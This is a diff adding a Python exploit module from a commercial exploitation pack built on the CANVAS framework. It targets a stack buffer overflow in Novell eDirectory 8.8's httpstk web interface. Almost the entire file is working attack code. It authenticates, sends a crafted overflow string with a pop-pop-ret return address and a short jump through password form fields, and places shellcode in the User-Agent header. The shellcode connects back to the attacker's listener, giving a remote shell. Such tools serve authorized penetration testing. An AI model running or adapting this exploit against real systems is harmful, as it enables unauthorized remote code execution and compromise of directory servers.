@@ -1,0 +1,158 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+
+import sys
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+import struct
+import httplib
+import urllib
+import canvasengine
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from shellcode import shellcodeGenerator
+from encoder import alphanumeric
+
+# GUI info
+NAME = "Novell eDirectory httpstk Stack Buffer Overflow Vulnerability"
+
+DESCRIPTION = "Stack Overflow Vulnerability in Novell eDirectory httpstk"
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR'] = "Novell"
+DOCUMENTATION["Repeatability"] = "One"
+DOCUMENTATION["Date public"] = "2009.11.17"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/37042"
+DOCUMENTATION["Versions Affected"] = "Novell eDirectory 8.8"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "1.0"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000", "2003" ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0 : [ "eDirectory 8.8", 0x7c3410c2 ], # pop, pop, ret
+}
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.setInfo(DESCRIPTION)
+        self.name = NAME      
+        self.usr = ""
+        self.pwd = ""
+        self.port = 8030
+        self.version = 0
+        self.badstring = "\x00"
+        self.searchbadstring = self.badstring
+        return
+
+
+    def neededListenerTypes(self):
+        from canvasengine import WIN32MOSDEF
+        return [WIN32MOSDEF]    
+
+
+    def createShellcode(self):
+        if self.callback:
+            host = self.callback.ip
+            port = self.callback.port                   
+
+        sc = self.createHeapSafeInject(self.badstring, host, port)            
+        self.createWin32SearchShellcode(host, port, rawshellcode=sc)
+        
+        
+    def run(self):
+        # Check arguments
+        self.host = self.target.interface                
+        self.port = int(self.argsDict.get("port", self.port))
+        self.usr = self.argsDict.get("usr", self.port)
+        self.pwd = self.argsDict.get("pwd", self.port)
+                        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))                
+
+        sploitstring = self.makesploit()        
+        
+        mainurl = "https://%s:%i/" % (self.host, self.port)       
+        
+        ua = spkproxy.UserAgent(mainurl, exploit=self)
+        
+        params = urllib.urlencode({'usr':self.usr, 'pwd':self.pwd, 'Login':'Login'})        
+        data = ua.POST("_LOGIN_SERVER_RSP_", params) 
+                
+        params = urllib.urlencode({'sadminpwd':sploitstring, 'verifypwd':sploitstring})
+        ua.addHeader("User-Agent", self.shellcode )
+        ua.POST("dhost/httpstk;submit", params)                
+        
+        ret = self.ISucceeded()
+        
+        if not ret:
+        	self.log("Sleeping for two seconds to check for callback")
+        	time.sleep(2)
+        	ret = self.ISucceeded()        
+
+        if ret:
+        	self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog=True)
+        	self.log("%s done (succeeded!)" % self.name)            
+        
+        return ret
+        
+        
+    def makesploit(self):				
+    	os_name, eip = targets[self.version]
+    	ret = struct.pack('<L', eip)
+    	
+        data = "A" * 516
+        data = data[:20] + self.encodedsearchcode + data[len(self.encodedsearchcode)+20:]
+        
+        sploitstring = data + "\xeb\x06\x90\x90" + ret + "\x90\x90\xe9\xfc\xfd\xff\xff\x90" + "A"*500  
+        
+    	return sploitstring
+      
+        		
+    def displayVersions(self):
+    	i = 0
+    	print 'Available versions:'
+    	for listline in targets.values():
+    		print "\t%d: %s" % (i,listline[0])
+    		i += 1
+
+
+    def usage(self):
+    	print "Usage: %s -v version -t targethost -p port -l localip -d localport\n" % (sys.argv[0])
+    	self.displayVersions()
+    	sys.exit(0)
+
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
